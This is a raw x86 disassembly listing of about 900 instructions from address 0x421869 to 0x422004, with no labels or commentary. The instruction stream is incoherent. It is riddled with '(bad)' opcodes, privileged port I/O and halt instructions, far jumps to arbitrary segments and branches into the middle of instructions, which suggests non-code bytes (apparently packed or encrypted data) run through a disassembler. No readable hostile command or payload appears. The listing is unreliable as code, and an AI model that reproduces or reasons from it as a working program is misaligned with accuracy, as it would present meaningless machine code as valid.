  421869:	inc    edx
  42186a:	pop    edx
  42186b:	add    ah,dh
  42186d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42186e:	fiadd  DWORD PTR [esp+ebp*8]
  421871:	add    al,0x64
  421873:	mov    ecx,0xb1cdb42a
  421878:	xchg   BYTE PTR [ebp+eax*8+0xd4],dh
  42187f:	add    BYTE PTR [eax],al
  421881:	jb     0x42180a
  421883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421884:	mov    al,0x76
  421886:	or     DWORD PTR [ebx+0x2c],0x7940ac12
  42188d:	xchg   DWORD PTR [esi-0x78f4e3c2],eax
  421893:	out    0x3,al
  421895:	(bad)  
  421896:	xchg   ecx,eax
  421897:	arpl   WORD PTR [ecx+0x167ebada],si
  42189d:	test   BYTE PTR [edx],0xe7
  4218a0:	jp     0x4218e9
  4218a2:	cli    
  4218a3:	ds pusha 
  4218a5:	gs ret 0xe8ff
  4218a9:	cmc    
  4218aa:	push   ds
  4218ab:	mov    BYTE PTR [ecx-0x3e],bh
  4218ae:	shl    ah,0x6c
  4218b1:	daa    
  4218b2:	push   cs
  4218b3:	inc    esp
  4218b4:	cmp    esi,esi
  4218b6:	cwde   
  4218b7:	imul   ecx
  4218b9:	das    
  4218ba:	inc    ebp
  4218bb:	jae    0x4218a7
  4218bd:	sub    eax,0xcc6ae7c8
  4218c2:	or     DWORD PTR [eax],eax
  4218c4:	xchg   edi,eax
  4218c5:	mov    ds:0xfe542c0,eax
  4218ca:	nop
  4218cb:	pop    ds
  4218cc:	fwait
  4218cd:	mov    eax,ds:0xa925721e
  4218d2:	push   ds
  4218d3:	jb     0x4218c6
  4218d5:	std    
  4218d6:	mov    edi,0xd79bb983
  4218db:	cld    
  4218dc:	hlt    
  4218dd:	push   es
  4218de:	repz aas 
  4218e0:	jmp    0x27ca4ec4
  4218e5:	add    BYTE PTR [eax],al
  4218e7:	add    BYTE PTR [eax],al
  4218e9:	add    BYTE PTR [ecx+0x65],bh
  4218ec:	mov    bh,0xf7
  4218ee:	fwait
  4218ef:	add    bl,0xcd
  4218f2:	xchg   ebx,eax
  4218f3:	nop
  4218f4:	or     edx,ecx
  4218f6:	shl    DWORD PTR [ecx-0x3],0xde
  4218fa:	xchg   ebx,eax
  4218fb:	nop
  4218fc:	pop    ss
  4218fd:	sar    ecx,0x60
  421900:	std    
  421901:	into   
  421902:	cmp    esp,DWORD PTR ds:0x1e588d78
  421908:	pop    esp
  421909:	pop    ds
  42190a:	cs inc esp
  42190c:	rcl    ebp,0x76
  42190f:	mov    cl,0x88
  421911:	mov    ebp,0xeb8328f1
  421916:	jbe    0x42191a
  421918:	push   ecx
  421919:	aaa    
  42191a:	sub    ah,BYTE PTR [ebp+0x1cb91047]
  421920:	rcr    DWORD PTR fs:[ecx],1
  421923:	(bad)  
  421925:	inc    DWORD PTR [edi+ecx*1]
  421928:	in     al,0xff
  42192a:	pop    ebx
  42192b:	cwde   
  42192c:	in     al,dx
  42192d:	xor    esp,edi
  42192f:	popf   
  421930:	jno    0x42191a
  421932:	pop    es
  421933:	ror    BYTE PTR [ebx],1
  421935:	test   BYTE PTR [ebx+0x6],bl
  421938:	add    BYTE PTR [eax],al
  42193a:	inc    edi
  42193b:	pop    ds
  42193c:	add    di,bp
  42193f:	dec    esi
  421940:	test   DWORD PTR [ebp+0x44],ebx
  421943:	in     al,0x4c
  421945:	inc    eax
  421946:	adc    ecx,eax
  421948:	or     eax,DWORD PTR [ebp+0x656]
  42194e:	add    BYTE PTR [eax],al
  421950:	add    BYTE PTR [eax],al
  421952:	add    BYTE PTR [edi],dl
  421954:	pop    ds
  421955:	mov    DWORD PTR [ebp+0x48],ecx
  421958:	ss pushw cs
  42195b:	ret    0x4ce3
  42195e:	adc    al,0x11
  421960:	ror    DWORD PTR [ebx],0x85
  421963:	mov    ds:0x75000006,al
  421968:	mov    al,ds:0x994cfffd
  42196d:	inc    ecx
  42196e:	cld    
  42196f:	out    0x17,eax
  421971:	mov    DWORD PTR [ebp+0x50],edx
  421974:	xor    ecx,DWORD PTR [edi+edi*8-0x13]
  421978:	daa    
  421979:	add    eax,0x1819d4b
  42197f:	dec    esp
  421980:	add    BYTE PTR ds:0x8016505d,dh
  421986:	jl     0x4219a5
  421988:	add    BYTE PTR [eax],al
  42198a:	mov    edx,DWORD PTR [ecx-0x16]
  42198d:	xchg   DWORD PTR [eax],ecx
  42198f:	call   0x894e:0x1cfffd06
  421996:	xchg   ebp,eax
  421997:	pushf  
  421998:	in     al,0xfb
  42199a:	(bad)  
  42199b:	ds jle 0x42198a
  42199e:	add    esp,DWORD PTR [ecx]
  4219a0:	repnz dec edi
  4219a2:	push   DWORD PTR [ebp-0x26]
  4219a5:	jae    0x873f0f60
  4219ab:	inc    eax
  4219ac:	cdq    
  4219ad:	push   ss
  4219ae:	adc    al,ch
  4219b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219b1:	cmp    ebp,0xffffffd2
  4219b4:	xchg   esp,eax
  4219b5:	rcl    DWORD PTR [eax+0x0],cl
  4219b8:	add    BYTE PTR [eax],al
  4219ba:	add    BYTE PTR [eax],al
  4219bc:	mul    BYTE PTR [ecx+0x22]
  4219bf:	out    0xbb,eax
  4219c1:	jbe    0x4219e8
  4219c3:	cld    
  4219c4:	in     al,dx
  4219c5:	data16 xor BYTE PTR [eax+0x776b538],cl
  4219cc:	inc    ebx
  4219cd:	mov    esi,0xc4a07f8c
  4219d2:	and    dl,BYTE PTR [ecx+0xd]
  4219d5:	fsin   
  4219d7:	xor    DWORD PTR [ecx+0x79],ebp
  4219da:	and    ecx,DWORD PTR [esi+0x61]
  4219dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219de:	inc    ebx
  4219df:	jae    0x421a5a
  4219e1:	cmp    BYTE PTR [ebx],ah
  4219e3:	call   0x7fbec84f
  4219e8:	jo     0x4219de
  4219ea:	and    cl,BYTE PTR [edi-0x3a]
  4219ed:	test   al,0x3b
  4219ef:	cld    
  4219f0:	dec    ebp
  4219f1:	mov    esi,0x905afd54
  4219f6:	sub    ebp,DWORD PTR [ecx-0x24]
  4219f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219fa:	lods   al,BYTE PTR ds:[esi]
  4219fb:	sub    DWORD PTR [ebp+0x75808601],0x29
  421a02:	push   0x3e9c6a3
  421a07:	mov    DWORD PTR [ebp-0x10],eax
  421a0a:	es jae 0x421a84
  421a0d:	mov    al,ds:0x59b0884b
  421a12:	ja     0x421a86
  421a14:	sbb    eax,0xb90c3700
  421a19:	popa   
  421a1a:	out    0xf0,eax
  421a1c:	sbb    DWORD PTR [edi],0x369a
  421a22:	add    BYTE PTR [eax],al
  421a24:	add    BYTE PTR [ebx+0x2],ah
  421a27:	sbb    edi,edi
  421a29:	ret    0x1f69
  421a2c:	(bad)  
  421a2d:	repnz mov al,0x37
  421a30:	aam    0xff
  421a32:	les    esp,FWORD PTR [edx-0x2d]
  421a35:	dec    eax
  421a36:	sbb    ebx,ebx
  421a38:	xchg   ebx,eax
  421a39:	test   dl,al
  421a3b:	out    0x78,al
  421a3d:	stos   BYTE PTR es:[edi],al
  421a3e:	mov    WORD PTR [ebx],gs
  421a40:	sub    al,0xd2
  421a42:	sahf   
  421a43:	xor    eax,0x2a7ec125
  421a48:	adc    edi,DWORD PTR [eax-0x5d87a96c]
  421a4e:	sub    DWORD PTR [eax-0x4ae557a0],ebp
  421a54:	sbb    ebx,DWORD PTR [esi+0x5f]
  421a57:	inc    esp
  421a58:	and    al,0xf5
  421a5a:	sbb    edi,DWORD PTR ds:0xcb7f76ae
  421a60:	das    
  421a61:	mov    dl,BYTE PTR [ebx+eiz*4]
  421a64:	das    
  421a65:	je     0x4219fd
  421a67:	fstp   DWORD PTR [ecx+0x3f938d04]
  421a6d:	retf   0xd92a
  421a70:	sub    BYTE PTR [edx+0x1a],0x5b
  421a74:	mov    esi,0x2d8eb36a
  421a79:	jne    0x421af7
  421a7b:	fcomp  DWORD PTR [ebx+0x11500662]
  421a81:	fisttp QWORD PTR [edi]
  421a83:	jmp    0xcfec7f0d
  421a88:	pop    es
  421a89:	add    BYTE PTR [eax],al
  421a8b:	add    BYTE PTR [eax],al
  421a8d:	add    dh,bl
  421a8f:	hlt    
  421a90:	dec    esi
  421a91:	adc    al,0x75
  421a93:	jp     0x421a8d
  421a95:	mov    ?,WORD PTR [eax]
  421a97:	mov    bl,0x61
  421a99:	leave  
  421a9a:	push   ds
  421a9b:	sub    ebp,DWORD PTR [ebx]
  421a9d:	and    DWORD PTR [ecx],ebx
  421a9f:	sbb    dh,BYTE PTR [ecx+ecx*8+0x3cffff06]
  421aa6:	and    ch,BYTE PTR [esi+ebp*2+0x5749dc5c]
  421aad:	xchg   ecx,eax
  421aae:	pop    ebx
  421aaf:	cmp    edi,0xffffffe8
  421ab2:	add    eax,0x1939f7c5
  421ab7:	adc    BYTE PTR [eax],al
  421ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aba:	jmp    0x67f2:0x2deaefa1
  421ac1:	je     0x421b3d
  421ac3:	dec    esp
  421ac4:	adc    BYTE PTR [ecx],al
  421ac6:	cwde   
  421ac7:	add    al,bh
  421ac9:	fimul  DWORD PTR [esi]
  421acb:	sub    al,BYTE PTR [eax]
  421acd:	sub    eax,0xb9c58ac2
  421ad2:	add    eax,ebp
  421ad4:	sti    
  421ad5:	inc    ecx
  421ad6:	test   DWORD PTR ds:0xc47f4efc,ebx
  421adc:	repz icebp 
  421ade:	add    dl,bl
  421ae0:	imul   edi,DWORD PTR [ecx-0x6e246b1b],0xe981585e
  421aea:	jbe    0x421a79
  421aec:	inc    edx
  421aed:	and    ecx,eax
  421aef:	mov    eax,ds:0xeaf5
  421af4:	add    BYTE PTR [eax],al
  421af6:	add    BYTE PTR [eax-0xb],ah
  421af9:	sbb    DWORD PTR [bp+si-0x1f],esi
  421afd:	adc    eax,DWORD PTR [ecx-0x22d1fd83]
  421b03:	push   cs
  421b04:	and    BYTE PTR [eax],al
  421b06:	int3   
  421b07:	dec    edx
  421b08:	mov    eax,ds:0xf55eeaef
  421b0d:	mov    BYTE PTR [edi],ah
  421b0f:	or     DWORD PTR [edx+0x328ee542],ecx
  421b15:	sti    
  421b16:	ficom  WORD PTR [edi-0x76]
  421b19:	jb     0x421adc
  421b1b:	inc    ebx
  421b1c:	cmp    cl,BYTE PTR [eax+0x78a5524]
  421b22:	add    BYTE PTR [ebp+eiz*8+0x4d],bh
  421b26:	or     BYTE PTR [edi+0x148be84a],al
  421b2c:	jb     0x421b7f
  421b2e:	cld    
  421b2f:	pop    esi
  421b30:	dec    esi
  421b31:	sti    
  421b32:	push   ecx
  421b33:	clc    
  421b34:	mov    DWORD PTR [edi+ecx*1-0x5b2a8],edi
  421b3b:	add    ecx,DWORD PTR [eax+0xd57ec41]
  421b41:	push   eax
  421b42:	(bad)  
  421b43:	jge    0x421b4b
  421b45:	xchg   DWORD PTR [esi],eax
  421b47:	push   0xffffffe5
  421b49:	dec    esp
  421b4a:	or     BYTE PTR [edi+0x42],dl
  421b4d:	hlt    
  421b4e:	push   0x71
  421b50:	push   esi
  421b51:	in     al,0x9
  421b53:	push   esp
  421b54:	in     al,0xfb
  421b56:	pop    edi
  421b57:	repnz push edi
  421b59:	(bad)
  421b5c:	add    BYTE PTR [eax],al
  421b5e:	add    BYTE PTR [eax],al
  421b60:	jmp    0x60c403ec
  421b65:	mov    esp,edi
  421b67:	dec    DWORD PTR [edi+ecx*2+0x7a215752]
  421b6e:	shr    al,0xdf
  421b71:	jle    0x421b6f
  421b73:	call   DWORD PTR [ebx+0x7a]
  421b76:	or     BYTE PTR [ebx+0x2866554a],cl
  421b7c:	aaa    
  421b7d:	jae    0x421b38
  421b7f:	je     0x421b04
  421b81:	in     al,0xfb
  421b83:	call   0x3cd690
  421b88:	adc    eax,0xd2c08157
  421b8d:	push   ds
  421b8e:	xchg   DWORD PTR [ebp+0x54],eax
  421b91:	mov    DWORD PTR [ecx*4-0x74adf817],eax
  421b98:	sti    
  421b99:	push   eax
  421b9a:	dec    esp
  421b9b:	jmp    FWORD PTR [ebp+0x75fffc9a]
  421ba1:	sub    DWORD PTR [ebp-0x74dc5741],eax
  421ba7:	jb     0x421c12
  421ba9:	xor    DWORD PTR [ebp+0x11],esp
  421bac:	jne    0x421bd7
  421bae:	sub    eax,DWORD PTR [ecx]
  421bb0:	inc    esi
  421bb1:	imul   edi,DWORD PTR [esi+0x45629e5d],0x8ad67507
  421bbb:	jmp    0x421bb1
  421bbd:	test   DWORD PTR [edi-0x1],eax
  421bc0:	jmp    0x0:0x55b329
  421bc7:	add    BYTE PTR [eax],al
  421bc9:	dec    edx
  421bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bcb:	pushf  
  421bcc:	pop    es
  421bcd:	inc    edx
  421bce:	xchg   esp,eax
  421bcf:	adc    edx,DWORD PTR [ebp+0x5f]
  421bd2:	hlt    
  421bd3:	mov    ebx,0x1e90f8e7
  421bd8:	cld    
  421bd9:	sub    ch,bh
  421bdb:	lods   eax,DWORD PTR ds:[esi]
  421bdc:	ins    DWORD PTR es:[edi],dx
  421bdd:	in     al,dx
  421bde:	data16 sub al,0x57
  421be1:	popf   
  421be2:	test   eax,0x58aafc1e
  421be7:	mov    dh,0x69
  421be9:	adc    ah,BYTE PTR [edx-0x4ec2103c]
  421bef:	xchg   edx,eax
  421bf0:	cld    
  421bf1:	xchg   edx,eax
  421bf2:	fdiv   DWORD PTR [esi-0x76c2e0ab]
  421bf8:	inc    edx
  421bf9:	lea    esi,[ecx+0x28]
  421bfc:	gs jp  0x421bdf
  421bff:	push   ds
  421c00:	push   esp
  421c01:	retf   
  421c02:	jae    0x421bb1
  421c04:	xchg   BYTE PTR [eax-0x43184433],dh
  421c0a:	or     BYTE PTR [edi],bl
  421c0c:	cld    
  421c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c0e:	in     al,0xd8
  421c10:	pop    edx
  421c11:	popa   
  421c12:	xchg   edx,eax
  421c13:	(bad)  
  421c14:	idiv   DWORD PTR [edx-0x4a]
  421c17:	(bad)  
  421c18:	cld    
  421c19:	jge    0x421ba1
  421c1b:	pop    ds
  421c1c:	or     al,0xf1
  421c1e:	add    DWORD PTR [ecx],ebx
  421c20:	add    esi,DWORD PTR [ebp+0x2]
  421c23:	jo     0x421be3
  421c25:	dec    edx
  421c26:	mov    DWORD PTR [ebx],esi
  421c28:	sub    BYTE PTR [ebx-0x4b],ch
  421c2b:	mov    esi,0x97
  421c30:	add    BYTE PTR [eax],al
  421c32:	ins    DWORD PTR es:[edi],dx
  421c33:	mov    ebx,DWORD PTR [ebx]
  421c35:	sub    al,0xff
  421c37:	mov    esp,0xa302bc2
  421c3c:	out    0x3,eax
  421c3e:	cli    
  421c3f:	mov    ah,0xb2
  421c41:	ficomp DWORD PTR [edi+0x5cee1a12]
  421c47:	mov    ds:0xb9ba966b,eax
  421c4c:	jle    0x421be3
  421c4e:	arpl   WORD PTR [edx],ax
  421c50:	out    0x20,eax
  421c52:	adc    dh,BYTE PTR [bx+di+0x49]
  421c56:	inc    edx
  421c57:	lods   al,BYTE PTR ds:[esi]
  421c58:	jmp    0x182b:0x4694ffbc
  421c5f:	dec    esi
  421c60:	ins    BYTE PTR es:[edi],dx
  421c61:	and    BYTE PTR [ebx],ah
  421c63:	mov    ecx,0x8ad2c673
  421c68:	xor    eax,0xe70a002b
  421c6d:	add    esp,DWORD PTR [ebx+edi*1+0x4d]
  421c71:	xchg   esi,eax
  421c72:	mov    ds:0x6474038a,al
  421c77:	ret    0x20e6
  421c7a:	mov    eax,ds:0x61b93d8
  421c7f:	(bad)
  421c83:	xchg   esp,eax
  421c84:	cwde   
  421c85:	mov    WORD PTR [edx],?
  421c87:	test   BYTE PTR [edi],al
  421c89:	add    dh,BYTE PTR [ebp+0x2]
  421c8c:	addr16 call 0xc458:0x4a69cb77
  421c94:	jnp    0x421c38
  421c96:	add    BYTE PTR [eax],al
  421c98:	add    BYTE PTR [eax],al
  421c9a:	add    bl,ch
  421c9c:	jmp    0x8c844ec9
  421ca1:	jmp    FWORD PTR [ebx-0x45fc6f7a]
  421ca7:	mov    dh,0x2a
  421ca9:	add    dl,cl
  421cab:	imul   esi,DWORD PTR [ebp-0x3],0xffffffde
  421caf:	clc    
  421cb0:	rcl    bl,0x12
  421cb3:	mov    dh,0x91
  421cb5:	inc    esp
  421cb6:	bound  ebp,QWORD PTR [ecx+0x61c1428a]
  421cbc:	jecxz  0x421c6b
  421cbe:	mov    edi,0x3dbf816a
  421cc3:	sub    BYTE PTR [ecx-0x4d3e5ebe],cl
  421cc9:	push   eax
  421cca:	cmp    dl,BYTE PTR [edx-0x4393f470]
  421cd0:	inc    ebp
  421cd1:	push   eax
  421cd2:	cmp    DWORD PTR [edx-0x49066410],eax
  421cd8:	adc    eax,0x91788181
  421cdd:	adc    al,0x7e
  421cdf:	in     al,dx
  421ce0:	dec    ecx
  421ce1:	mov    BYTE PTR [ecx+esi*1],ch
  421ce4:	sbb    eax,0x165b3d70
  421ce9:	cld    
  421cea:	fadd   QWORD PTR [edx+0x7c]
  421ced:	inc    edx
  421cee:	push   ebp
  421cef:	mov    dh,al
  421cf1:	mov    edi,ebx
  421cf3:	mov    dh,0x15
  421cf5:	std    
  421cf6:	aam    0x62
  421cf8:	sbb    eax,0x167389b8
  421cfd:	imul   edx,ebx,0x0
  421d03:	add    ch,ah
  421d05:	push   eax
  421d06:	cmp    esi,DWORD PTR [esi]
  421d08:	bound  edx,QWORD PTR [esi]
  421d0a:	push   edi
  421d0b:	inc    ecx
  421d0c:	sbb    edx,DWORD PTR [ebp-0x6de31701]
  421d12:	mov    dl,BYTE PTR [esi+ecx*8-0x6a51853]
  421d19:	adc    al,0xfc
  421d1b:	bound  ebx,QWORD PTR [ecx+edx*1]
  421d1e:	mov    BYTE PTR [eax],al
  421d20:	or     ebp,edx
  421d22:	aaa    
  421d23:	shl    DWORD PTR [edx+ebp*4+0x44c406f],cl
  421d2a:	inc    esp
  421d2b:	rol    BYTE PTR [edi],1
  421d2d:	enter  0x440b,0xe4
  421d31:	xor    eax,0xc0e459
  421d36:	xchg   esi,eax
  421d38:	xchg   edi,eax
  421d39:	jp     0x421d47
  421d3b:	push   edx
  421d3c:	pop    ebp
  421d3d:	dec    esi
  421d3e:	sti    
  421d3f:	jne    0x421d7d
  421d41:	jb     0x421cc4
  421d43:	cmp    al,0xcb
  421d45:	repz sti 
  421d47:	inc    DWORD PTR [ecx-0x2e]
  421d4a:	sti    
  421d4b:	jne    0x421d61
  421d4d:	push   ecx
  421d4e:	sti    
  421d4f:	ss sbb ecx,esp
  421d52:	xchg   eax,ebx
  421d54:	addr16 mov edi,0xf74077e4
  421d5a:	sti    
  421d5b:	adc    DWORD PTR [eax],0x15
  421d5e:	sti    
  421d5f:	jne    0x421db1
  421d61:	jmp    0xf48cbdba
  421d66:	sti    
  421d67:	jne    0x421d69
  421d69:	add    BYTE PTR [eax],al
  421d6b:	add    BYTE PTR [eax],al
  421d6d:	clc    
  421d6e:	xchg   DWORD PTR [ecx],esi
  421d70:	inc    eax
  421d71:	lahf   
  421d72:	inc    eax
  421d73:	cld    
  421d74:	(bad)  
  421d75:	jb     0x421d6b
  421d77:	jno    0x421d69
  421d79:	dec    ebx
  421d7a:	iret   
  421d7b:	sti    
  421d7c:	jne    0x421db2
  421d7e:	hlt    
  421d7f:	sar    bh,cl
  421d81:	rcl    esp,0xfb
  421d84:	(bad)  
  421d85:	cmp    edi,DWORD PTR [edx-0xc]
  421d88:	jmp    DWORD PTR [edx-0x75]
  421d8b:	inc    ecx
  421d8c:	(bad)  
  421d8d:	jmp    0x421de5
  421d8f:	push   edi
  421d90:	leave  
  421d91:	dec    esi
  421d92:	add    eax,0xe3e75500
  421d97:	jge    0x421d85
  421d99:	aam    0x1
  421d9b:	add    BYTE PTR [eax],al
  421d9d:	jne    0x421d3f
  421d9f:	(bad)  
  421da0:	or     eax,ebx
  421da2:	test   al,0x40
  421da4:	sub    esp,DWORD PTR [ebp-0x7f86804]
  421daa:	sahf   
  421dab:	enter  0x42fa,0xd
  421daf:	mov    cl,0x86
  421db1:	test   al,0xd
  421db3:	sub    DWORD PTR [edi+edx*8+0x35821a1b],edx
  421dba:	and    eax,0x2974e684
  421dbf:	add    BYTE PTR [ebx-0x3e31e10],cl
  421dc5:	adc    bh,dl
  421dc7:	sub    ebx,DWORD PTR [eiz*2+0x5890029]
  421dce:	mov    ds:0xef94,eax
  421dd3:	add    BYTE PTR [eax],al
  421dd5:	add    al,dh
  421dd7:	dec    ebx
  421dd8:	or     al,BYTE PTR [ebp+eax*8-0x1ffffd6]
  421ddf:	sbb    ecx,DWORD PTR [ebp-0x4a258eb6]
  421de5:	cld    
  421de6:	add    eax,0x750003ae
  421deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dec:	inc    ebx
  421ded:	or     al,0xf0
  421def:	into   
  421df0:	add    BYTE PTR [eax],al
  421df2:	jne    0x421d94
  421df4:	les    ecx,FWORD PTR [ebx]
  421df6:	out    dx,al
  421df7:	and    DWORD PTR [ebp-0x4fa882ae],ecx
  421dfd:	cld    
  421dfe:	inc    esp
  421dff:	adc    eax,0xa672bf85
  421e04:	jb     0x421e04
  421e06:	call   0x8d43:0x1f54af29
  421e0d:	jb     0x421ddc
  421e0f:	popa   
  421e10:	sub    dl,al
  421e12:	add    ch,BYTE PTR [ecx]
  421e14:	add    BYTE PTR [ecx-0x359ded8],cl
  421e1a:	inc    BYTE PTR [ecx]
  421e1c:	sub    eax,0xbf04dcb4
  421e21:	sub    edi,DWORD PTR [ebx+0x50]
  421e24:	adc    al,0x1d
  421e26:	pop    ecx
  421e27:	(bad)  
  421e28:	fimul  WORD PTR [eax-0x3c263d71]
  421e2e:	dec    edx
  421e2f:	mov    BYTE PTR [esi],bl
  421e31:	adc    eax,0x1d11f81d
  421e36:	and    DWORD PTR [ecx+ebp*1],edx
  421e39:	or     eax,0x0
  421e3e:	add    cl,bh
  421e40:	mov    ch,0xe7
  421e42:	add    esi,DWORD PTR [ebp+0x7f]
  421e45:	inc    ebx
  421e46:	or     al,0x75
  421e48:	test   al,0x4d
  421e4a:	(bad)  
  421e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e4c:	push   esi
  421e4d:	cs sub al,0xff
  421e50:	xchg   edx,eax
  421e51:	out    0x3,al
  421e53:	cld    
  421e54:	mov    esp,0x857a88ea
  421e59:	sbb    edi,DWORD PTR [esp+eiz*4]
  421e5c:	xchg   DWORD PTR [ecx+esi*4+0x77771342],edx
  421e63:	jmp    0xe38d:0x2286e612
  421e6a:	mov    BYTE PTR [edi+0x3a],ah
  421e6d:	jle    0x421e74
  421e6f:	gs add ah,bh
  421e72:	mov    dh,BYTE PTR [edi]
  421e74:	push   ss
  421e75:	xchg   ecx,eax
  421e76:	pop    es
  421e77:	hlt    
  421e78:	pushf  
  421e79:	jb     0x421e7e
  421e7b:	dec    edi
  421e7c:	stos   BYTE PTR es:[edi],al
  421e7d:	pop    ebx
  421e7e:	xchg   esi,eax
  421e7f:	add    bh,BYTE PTR [edx+0x229b94e]
  421e85:	out    0x88,eax
  421e87:	aaa    
  421e88:	push   es
  421e89:	bound  ecx,QWORD PTR [ebx]
  421e8b:	out    dx,al
  421e8c:	lods   al,BYTE PTR ds:[esi]
  421e8d:	inc    esi
  421e8e:	mov    cl,0xfd
  421e90:	sub    ebx,DWORD PTR [eax+0x527089b3]
  421e96:	add    esi,DWORD PTR [ebp+0x2]
  421e99:	add    BYTE PTR [esi+esi*1-0x70],ch
  421e9d:	or     ah,BYTE PTR [edx+0xb]
  421ea0:	xor    ah,bh
  421ea2:	cmp    al,BYTE PTR [eax]
  421ea4:	add    BYTE PTR [eax],al
  421ea6:	add    BYTE PTR [eax],al
  421ea8:	jns    0x421eac
  421eaa:	add    BYTE PTR [eax+0x3b],dh
  421ead:	sbb    ch,al
  421eaf:	in     eax,dx
  421eb0:	cmc    
  421eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eb2:	imul   ecx
  421eb4:	sbb    al,0xa9
  421eb6:	mov    bh,BYTE PTR [esi+eax*1]
  421eb9:	paddb  mm7,mm6
  421ebc:	jmp    FWORD PTR [ecx]
  421ebe:	and    esi,DWORD PTR [esi+0x76]
  421ec1:	add    cl,BYTE PTR [ecx+0x527a8e74]
  421ec7:	in     eax,0xfa
  421ec9:	(bad)  
  421eca:	xrelease xchg DWORD PTR fs:[eax-0x5d],ebx
  421ecf:	pop    edx
  421ed0:	xor    DWORD PTR [edx],edx
  421ed2:	or     eax,0xd1846825
  421ed7:	test   dl,0x40
  421eda:	sub    BYTE PTR [ecx-0x6abd768b],0xea
  421ee1:	adc    DWORD PTR [ebx+0x65fb05a9],eax
  421ee7:	push   0xffffffc9
  421ee9:	adc    DWORD PTR [eax-0x1c],esi
  421eec:	inc    ecx
  421eed:	imul   esi,DWORD PTR [esi+0x29],0x3851b871
  421ef4:	cld    
  421ef5:	test   BYTE PTR [edi-0x7a],cl
  421ef8:	outs   dx,BYTE PTR ds:[esi]
  421ef9:	push   cs
  421efa:	dec    edi
  421efb:	ins    BYTE PTR es:[edi],dx
  421efc:	mov    ah,0x9
  421efe:	push   eax
  421eff:	or     DWORD PTR [edi+0x53],0x45fa6efd
  421f06:	adc    esp,DWORD PTR [esi+0x4]
  421f09:	push   cs
  421f0a:	mov    BYTE PTR [ecx+0x0],bl
  421f0d:	add    BYTE PTR [eax],al
  421f0f:	add    BYTE PTR [eax],al
  421f11:	jle    0x421f49
  421f13:	cld    
  421f14:	fdivr  QWORD PTR [esi+0xe]
  421f17:	aam    0x64
  421f19:	mov    es,WORD PTR [bx+di]
  421f1c:	add    BYTE PTR [esi-0x6c247f30],cl
  421f22:	xchg   ecx,eax
  421f23:	add    DWORD PTR [eax],0x726a058c
  421f29:	shl    DWORD PTR [ebx-0x20],1
  421f2c:	pop    eax
  421f2d:	dec    esi
  421f2e:	shl    ah,1
  421f30:	mov    eax,0x8b000502
  421f35:	add    DWORD PTR [ecx],eax
  421f37:	mov    al,BYTE PTR [ebp+0x54]
  421f3a:	push   ebp
  421f3b:	jg     0x421f04
  421f3d:	inc    esp
  421f3e:	push   esp
  421f3f:	xchg   esi,eax
  421f41:	fdivr  QWORD PTR [edi+0x41]
  421f44:	or     al,0x74
  421f46:	test   eax,0x9123fff8
  421f4b:	mov    esp,0xbfeb1e74
  421f50:	push   0xffffffbd
  421f52:	jnp    0x421fc5
  421f54:	in     al,0x64
  421f56:	fimul  WORD PTR [ebp-0x76fae382]
  421f5c:	inc    ebp
  421f5d:	add    al,0x55
  421f5f:	push   ebx
  421f60:	mov    ebx,edx
  421f62:	push   esp
  421f63:	xchg   DWORD PTR [ebp+0x10],eax
  421f66:	fnstsw WORD PTR [esi-0x4]
  421f69:	and    ebp,esp
  421f6b:	add    al,0x88
  421f6e:	or     dh,bh
  421f70:	ret    
  421f71:	xchg   BYTE PTR [esi-0x77],dh
  421f74:	jne    0x421f76
  421f76:	add    BYTE PTR [eax],al
  421f78:	add    BYTE PTR [eax],al
  421f7a:	call   0x82b303cb
  421f7f:	push   es
  421f80:	add    BYTE PTR [ebp+0x574ffe99],cl
  421f86:	inc    edi
  421f87:	ret    
  421f88:	dec    esp
  421f89:	mov    ecx,DWORD PTR [ecx+0x2061e7fa]
  421f8f:	in     al,dx
  421f90:	sti    
  421f91:	test   BYTE PTR [ecx+eax*4-0x2],bl
  421f95:	std    
  421f96:	dec    edi
  421f97:	xchg   ecx,eax
  421f98:	xlat   BYTE PTR ds:[ebx]
  421f99:	je     0x422010
  421f9b:	sub    DWORD PTR [ecx],ebx
  421f9d:	jb     0x42201c
  421f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa0:	(bad)  
  421fa1:	fcomi  st,st(6)
  421fa3:	rcr    BYTE PTR [ecx],cl
  421fa5:	out    0x2b,eax
  421fa7:	jne    0x421fbf
  421fa9:	cld    
  421faa:	jp     0x421ff9
  421fac:	or     al,ch
  421fae:	mov    ds:0xfefc16bf,al
  421fb3:	outs   dx,BYTE PTR ds:[esi]
  421fb4:	adc    BYTE PTR [esi+edi*4-0x6c],bl
  421fb8:	mov    edi,0xb021ee0b
  421fbd:	cld    
  421fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fbf:	and    DWORD PTR [ebp-0x4ef75cfb],ecx
  421fc5:	pop    es
  421fc6:	xchg   cl,bl
  421fc8:	mov    dh,0xc6
  421fca:	aaa    
  421fcb:	and    al,BYTE PTR [eax]
  421fcd:	push   ebx
  421fce:	dec    BYTE PTR ds:0x1c0deb80
  421fd4:	add    BYTE PTR [eax],al
  421fd6:	pop    cx
  421fd8:	fild   DWORD PTR [edx+0x6d]
  421fdb:	int3   
  421fdc:	push   es
  421fdd:	xchg   ebx,eax
  421fde:	add    BYTE PTR [eax],al
  421fe0:	add    BYTE PTR [eax],al
  421fe2:	add    BYTE PTR ds:0xc08aaed8,dh
  421fe8:	int    0x16
  421fea:	cld    
  421feb:	add    ch,BYTE PTR [ecx-0x44]
  421fee:	out    0xc9,eax
  421ff0:	rol    bl,cl
  421ff2:	push   edi
  421ff4:	pop    ecx
  421ff5:	mov    dh,0xe7
  421ff7:	jmp    0x4f4223e2
  421ffc:	cli    
  421ffd:	test   BYTE PTR [edx-0x3b],dh
  422000:	shr    DWORD PTR [ebx],1
  422002:	out    dx,al
  422003:	push   eax
  422004:	sbb    DWORD PTR [eax],eax
